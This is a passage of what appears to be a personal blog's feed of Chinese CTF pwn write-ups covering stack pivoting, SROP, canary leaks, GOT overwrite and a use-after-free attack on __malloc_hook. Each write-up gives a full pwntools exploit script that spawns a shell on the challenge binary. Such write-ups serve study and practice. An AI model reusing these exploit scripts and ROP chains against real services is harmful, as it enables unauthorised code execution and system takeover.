class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>sd(<span class="hljs-string">&#x27;-8&#x27;</span>)<br>rl()<br><br>payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(flag_addr)+ p64(flag_addr+<span class="hljs-number">0x50</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>sl(payload)<br>p.interactive()                  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>New-Star-Week 3-pwn stack migration revenge</title>
    <link href="/2024/10/23/New-Star-Week%203-pwn%20stack%20migration%20revenge/"/>
    <url>/2024/10/23/New-Star-Week%203-pwn%20stack%20migration%20revenge/</url>
    
    <content type="html"><![CDATA[<h2 id="New-Star-Week-3-pwn-stack-migration-revenge"><a href="#New-Star-Week-3-pwn-stack-migration-revenge" class="headerlink" title="New-Star-Week 3-pwn stack migration revenge"></a>New-Star-Week 3-pwn stack migration revenge</h2><p>开了NX和full relro</p><p>只溢出了8个字节，典型的栈迁移，这次迁移到bss段上。（以前做过的都是栈上的，特此记录。）</p><p><img src="D:\刷题wp\picture\image-20231031122412700.png" alt="利用函数"></p><blockquote><p>只要认真计算，可以不使用pop_rbp就完成条件。</p></blockquote><ul><li><p>首先要栈迁移到bss段上，所以要想办法对让read往bss段里输入，这时候要直到，read对buf的确定是rbp-0x50，也就是只要第一次把rbp改成bss段（选址要找好，否则会有问题，这个放在最后谈。）<del>一定不是因为我刚开始就选错了</del></p></li><li><p>然后注意要跳转的地方<img src="D:\刷题wp\picture\image-20231031163157516.png" alt="image-20231031163157516"></p></li><li><p>直接跳转到这里，不要让你<del>亲爱的</del>rbp跟着rsp跑了。</p><p>第一波输入：</p><p><img src="D:\刷题wp\picture\image-20231031163545145.png" alt="image-20231031163545145"></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(bss_addr+<span class="hljs-number">0x100</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+p64(bss_addr-<span class="hljs-number">0x50</span>)+p64(leave_ret)<br></code></pre></td></tr></table></figure><blockquote><p>由于是距离rbp-0x50的地方输入，所以输入的开头位置会是bss_addr-0x50，也就是最后自己的leave会返回到输入的位置，并且把第一个输入pop给rbp（这里不能让rbp再赋予bss_addr，而是要多加一点，不能影响到）至于为什么，我再卖个关子，最后说 》__《</p></blockquote><ul><li><p>这里接收到puts后，可以泄露libc基地址，然后再迁移打ret2libc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(pop_rdi)+<span class="hljs-built_in">p64</span>(bin_sh)+<span class="hljs-built_in">p64</span>(ret)+<span class="hljs-built_in">p64</span>(system_addr)<br>payload = payload<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">0</span>x50,b<span class="hljs-string">&#x27;A&#x27;</span>)+<span class="hljs-built_in">p64</span>(bss_addr+<span class="hljs-number">0</span>x100-<span class="hljs-number">0</span>x50)+<span class="hljs-built_in">p64</span>(leave_ret)<br></code></pre></td></tr></table></figure><blockquote><p>这里稍微解释一下吧：bss+0x100是上一次打入rbp的地址，输入地址是rbp-0x50，由于我在脚本中叫“main”的函数的最后有个leave ，所以会跳转到bss+0x100,这里刚好被写入了我输入的倒数第二个数据，使得rbp这里还有一个伪装的rbp，leave完毕后rbp变成我写的这个bss_addr+0x100-0x50,然后ret到leave_ret，将rsp挪到假rbp位置，然后pop rbp，由于rbp我不用再管了，干脆给了个0，然后继续往下执行system。</p></blockquote></li><li><p>第一个问题：选择bss的地址，既不能破坏原有数据，也要有足够的空间！！！！，反正最后一个页表是空的，多往下找一点，因为system在执行的时候会有扩展栈的行为，这时候就会用到相对低地址的地方，然后就失败了。</p></li><li><p>第二个问题：如果再次让bss_addr作为rbp，那么你就会发现，你会把自己接下来执行的东西改掉。因为本身rsp会到到rbp-0x50+8，如果这么做，接下来的代码就变成你新添加的一部分了<del>（会是填充的A,别问我怎么知道的，问就是干过）</del>。</p><p>总之：看着官方WP找到了自己的好多错误，还是有很多基础的东西需要补充的。</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25516)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br>pop_rdi = <span class="hljs-number">0x00000000004012b3</span><br>pop_rsi_r15 = <span class="hljs-number">0x00000000004012b1</span><br>leave_ret = <span class="hljs-number">0x401227</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br><span class="hljs-comment">#pop_rbp = 0x000000000040115d</span><br><br><br>puts_plt = <span class="hljs-number">0x401060</span><br>puts_got = <span class="hljs-number">0x403FD8</span><br>main_addr = <span class="hljs-number">0x4011f3</span><br>bss_addr = <span class="hljs-number">0x404900</span><br>payload =<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss_addr)+p64(main_addr)<br>gdb.attach(p)<br>sd(payload)<br><span class="hljs-comment">#rl()</span><br>payload = p64(bss_addr+<span class="hljs-number">0x100</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+p64(bss_addr-<span class="hljs-number">0x50</span>)+p64(leave_ret)<br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br>puts_addr = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc_base = puts_addr -libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base +libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>payload = p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system_addr)<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+p64(bss_addr+<span class="hljs-number">0x100</span>-<span class="hljs-number">0x50</span>)+p64(leave_ret)<br>gdb.attach(p)<br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStatCTF--week3-pwn srop</title>
    <link href="/2024/10/23/NewStatCTF--week3-pwn%20srop/"/>
    <url>/2024/10/23/NewStatCTF--week3-pwn%20srop/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStatCTF–week3-pwn-srop"><a href="#NewStatCTF–week3-pwn-srop" class="headerlink" title="NewStatCTF–week3-pwn srop"></a>NewStatCTF–week3-pwn srop</h3><p>主函数只有一个输出，一个输入，存在栈溢出</p><p><img src="D:\刷题wp\picture\image-20231031230618233.png"></p><blockquote><p>存在syscall函数，没有适当的可以改rdx的<del>别提ret2csu，太麻烦了</del> </p><p>所以用srop（而且题目就叫srop)</p><p>先改了rbp，然后跳转到主函数的这里</p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload = b&#x27;A&#x27;*(<span class="hljs-number">0</span>x30)+p64(<span class="hljs-name">bss_addr</span>)+p64(<span class="hljs-name">main_addr</span>)<br></code></pre></td></tr></table></figure><p><img src="D:\刷题wp\picture\image-20231031231028968.png" alt="image-20231031231028968"></p><ul><li>可以往下不可以往上，为什么详见上一篇的栈迁移</li></ul><p>然后输入就相当于在bss里输入了，但为什么不用额外找leave ret呢</p><p>–因为main函数最后又有一次leave ret</p><p>然后看代码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload=b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-comment">(0x30)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(pop_rdi)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(0xf)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(syscall_addr)</span>+bytes<span class="hljs-comment">(frame)</span><br></code></pre></td></tr></table></figure><blockquote><p>跳转回到了bss_addr+8的位置</p><p>也就刚好是pop_rdi，然后进行srop打execve。</p></blockquote><p>至于为什么要给rsp设置一个可读的地址，看下图，需要将地址为rsp+8位置存的数据赋给r9，如果不可读的话，就会访问错误。</p><p><img src="D:\刷题wp\picture\image-20231031230529582.png"></p><p>总结：<del>喵喵喵喵</del>   出的太妙了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br>sys_addr = <span class="hljs-number">0x401136</span><br>pop_rdi = <span class="hljs-number">0x0000000000401203</span><br>pop_rsi_r15 = <span class="hljs-number">0x0000000000401201</span><br>leave_ret = <span class="hljs-number">0x401191</span><br><br>bss_addr = <span class="hljs-number">0x404900</span><br>syscall_addr = <span class="hljs-number">0x401040</span><br>main_addr = <span class="hljs-number">0x401151</span><br>bin_sh = bss_addr-<span class="hljs-number">0x30</span><br><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">59</span><br>frame.rsi = bin_sh<br>frame.rdx = <span class="hljs-number">0</span><br>frame.rcx =<span class="hljs-number">0</span><br>frame.rsp= bss_addr<br>frame.rip =syscall_addr<br><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>)+p64(bss_addr)+p64(main_addr)<br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br><br><br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>)+p64(pop_rdi)+p64(<span class="hljs-number">0xf</span>)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br><br><br>gdb.attach(p)<br><br>sd(payload)<br><br><br>p.interactive()                  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GuestBooK--pwn</title>
    <link href="/2024/10/23/GuestBooK--pwn/"/>
    <url>/2024/10/23/GuestBooK--pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="GuestBooK–pwn"><a href="#GuestBooK–pwn" class="headerlink" title="GuestBooK–pwn"></a>GuestBooK–pwn</h3><ul><li><p>先利用read与puts，填充掉canary的最后一位，把canary打印出来，用这种不一样的字符方便接收和检验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&quot;B&quot;</span>+<span class="hljs-string">b&#x27;C&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="D:\刷题wp\picture\image-20231102185214523.png" alt="image-20231102185214523"></p><p>然后需要利用strcpy输入两次，第一次把最后一位不对的canary以及后门函数地址输入进去，第二次把canary最后一位改为‘00’</p><blockquote><p>当时没做出来，忘记了这种基础的泄露canary的方式了   <del>》我真该死《</del></p><p>有一些要注意的地方：</p><ul><li>填充不一样的字母来方便接收的停顿</li><li>strcpy遇到00会截断，所以不能有00，第一次注意注入的时候不要被截断掉</li><li>第二次利用strcpy会在最后加\x00的特性，来恢复canary的正确值</li><li>第二次不是在栈顶输入的，要加0x20</li><li>循环中的这个输入没有限制长度（当时做的时候<del>脑抽</del>没想到）</li></ul></blockquote><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./GuestBook&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>backdoor_addr = <span class="hljs-number">0x04012C0</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&quot;B&quot;</span>+<span class="hljs-string">b&#x27;C&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;B&#x27;</span>)<br><br>canary = u64(rc(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x8</span>)+p64(canary)*<span class="hljs-number">2</span>+p64(backdoor_addr)<br>sl(payload)<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)<br>debug()<br>sl(payload)<br><br>p.interactive()                <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow元旦水友赛-badboy</title>
    <link href="/2024/10/23/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B-badboy/"/>
    <url>/2024/10/23/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B-badboy/</url>
    
    <content type="html"><![CDATA[<h4 id="ctfshow元旦水友赛-badboy"><a href="#ctfshow元旦水友赛-badboy" class="headerlink" title="ctfshow元旦水友赛-badboy"></a>ctfshow元旦水友赛-badboy</h4><p>好久没打了，有人提到了，就看一看。</p><p>开了canary和nx保护，原本想着泄露canary，结果找不到泄露的方向。</p><p>kl点进去可以看到是6</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410231746207.png" alt="image-20240225185144632"></p><p>可以循环两次，第一次泄露6个字节，第二次泄露3个字节。第一次泄露libc,第二次泄露栈。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410231746208.png" alt="image-20240225185750638"></p><p>地址分别相差0x18(24)和0x38(56)，fd8-eb0&#x3D;0x128(296)</p><p>libc.sym查询不到__libc_start_call_main这个名字，直接手动查找相减找了偏移为0x1110+0x26000</p><p>(至于为什么又加了一个，因为手动vmmap看libc载入地址的时候看错地方了，第一个才是载入地址，这里看成了第二个，所以多减了一次。)</p><p>6个字节足够泄露一个完整的地址，而三个字节不可以，由于需要将buf地址改为put_got的地址，所以一定要知道栈的地址，而3个字节已经足够libc的偏移地址。</p><p>另：如果用远程打可以试着泄露下面的__libc_start_main,本地打通了，懒得再去打远程了。</p><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-attribute">p</span>=process(&#x27;./BadBoy-2&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./BadBoy-2&#x27;)<br><span class="hljs-attribute">libc</span>=elf.libc<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def <span class="hljs-built_in">debug</span>():<br>    gdb.attach(p)<br>    pause(1)<br>puts_got = 0x601018<br><span class="hljs-comment">#debug()</span><br><br>sl(b<span class="hljs-string">&#x27;56&#x27;</span>)<br>stack_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-0x128<br><span class="hljs-built_in">print</span>(hex(stack_addr))<br><br>sl(b<span class="hljs-string">&#x27;24&#x27;</span>)<br>rl()<br><span class="hljs-comment">#print(rl())</span><br><span class="hljs-attribute">libc_addr</span>=u64(rc(3).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-built_in">print</span>(hex(libc_addr))<br>libc_addr = libc_addr-122-0x1110-0x26000<br><span class="hljs-built_in">print</span>(hex(libc_addr))<br>system_addr = libc_addr+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(hex(system_addr))<br><br><span class="hljs-attribute">offset</span>=puts_got-stack_addr<br>ru(<span class="hljs-string">&#x27;girl&#x27;</span>)<br><br>sd(<span class="hljs-string">&#x27;sh\x00&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;me?&#x27;</span>)<br><span class="hljs-built_in">debug</span>()<br>sl(str(offset))<br><br>sd(p32(system_addr))<br>p.interactive()<br>~                   <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一道基础的uaf的两种食用方法~double free</title>
    <link href="/2024/10/23/%E4%B8%80%E9%81%93%E5%9F%BA%E7%A1%80%E7%9A%84uaf%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95double%20free/"/>
    <url>/2024/10/23/%E4%B8%80%E9%81%93%E5%9F%BA%E7%A1%80%E7%9A%84uaf%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95double%20free/</url>
    
    <content type="html"><![CDATA[<h4 id="一道基础的uaf的两种食用方法-double-free"><a href="#一道基础的uaf的两种食用方法-double-free" class="headerlink" title="一道基础的uaf的两种食用方法~double free"></a>一道基础的uaf的两种食用方法~double free</h4><ul><li>前情提要：libc-2.23，无teache。</li></ul><p>甚至不用改名字，出题人都给把名字叫好了（爱了爱了），这样子调试的时候很舒服</p><p><img src="D:\刷题wp\picture\image-20240228112431558.png" alt="image-20240228112431558"></p><p>欸，保护连pie都没开，或许还能用它学学别的做法。</p><p><img src="D:\刷题wp\picture\image-20240228112924762.png" alt="image-20240228112924762"></p><p>长度自定，可以堆溢出，但是这两种做法没有用到，以后考虑用它试着unlink啥的。</p><p><img src="D:\刷题wp\picture\image-20240228113055021.png" alt="image-20240228113055021"></p><p>创建函数的时候会有输入</p><p><img src="D:\刷题wp\picture\image-20240228113142834.png" alt="image-20240228113142834"></p><p>delete这里没有指针置0，存在uaf</p><p><img src="D:\刷题wp\picture\image-20240228113218918.png" alt="image-20240228113218918"></p><p>打印函数就是常规打印</p><p>先创建0x80的块，free掉，从unsorted bin 里打印泄露出libc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;AAAAAA&#x27;</span>)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;AAAAAA&#x27;</span>)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)</span></span>#<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)</span></span>#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-selector-id">#debug</span>()<br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>__malloc_hook_addr=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span>-<span class="hljs-number">0</span>x10<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(__malloc_hook_addr)</span></span>)<br></code></pre></td></tr></table></figure><h5 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h5><p>然后把它填上，free一个fastbin大小的块，修改fd指针为打hook的地址，创建两个块，第二个块就覆盖到打hook的地址那里了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ake_addr=__malloc_hook_addr-<span class="hljs-number">0</span>x20-<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;AAAA&#x27;</span>)</span></span>#<span class="hljs-number">4</span>=<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,p64(fake_addr)</span></span>)<br><span class="hljs-selector-id">#debug</span>()<br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;bbbb&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;B&#x27;</span>*(<span class="hljs-number">0</span>x13-<span class="hljs-number">8</span>)</span></span>+<span class="hljs-built_in">p64</span>(onegadget)+<span class="hljs-built_in">p64</span>(realloc+<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>总exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 